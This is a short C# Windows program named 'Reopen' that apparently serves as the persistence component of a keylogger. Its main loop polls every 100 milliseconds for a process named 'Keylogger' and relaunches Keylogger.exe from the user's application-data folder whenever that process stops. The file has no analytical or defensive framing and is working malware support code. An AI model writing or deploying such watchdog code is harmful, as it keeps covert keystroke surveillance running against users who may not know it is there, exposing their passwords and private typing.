using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Reopen
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());

            while (true)
            {
                Thread.Sleep(100);
                if (!GetProcess())
                {
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Local\Keylogger\Keylogger.exe");
                    Thread.Sleep(1000);
                }
            }
        }


        private static bool GetProcess()
        {
            Process[] pname = Process.GetProcessesByName("Keylogger");
            if (pname.Length == 0)
            {
                return false;
            }
            else
            {
                return true;
            }
        }
    }
}
